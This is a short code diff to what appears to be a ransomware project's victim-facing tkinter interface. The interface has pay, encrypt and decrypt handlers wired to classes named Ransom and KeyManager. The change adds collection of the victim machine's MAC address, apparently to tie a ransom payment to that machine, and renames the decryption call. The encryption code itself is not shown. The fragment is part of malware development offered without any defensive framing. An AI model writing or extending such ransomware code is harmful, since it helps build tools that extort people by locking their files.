@@ -1,6 +1,7 @@
 from tkinter import *
 from ransom import Ransom
 from KeyManager import KeyManager
+from uuid import getnode as get_mac
 
 
 #sudo apt-get install python3-tk
@@ -24,11 +25,11 @@ class GUI:
 
 
     def pay(self):
-        self.keyManager.pay()
+        self.keyManager.pay(get_mac())
 
     def decrypt(self):
         print('You have been')
-        self.ransom.decrypt()
+        self.ransom.startDecryption()
 
     def encrypt(self):
         print('Encrypted')
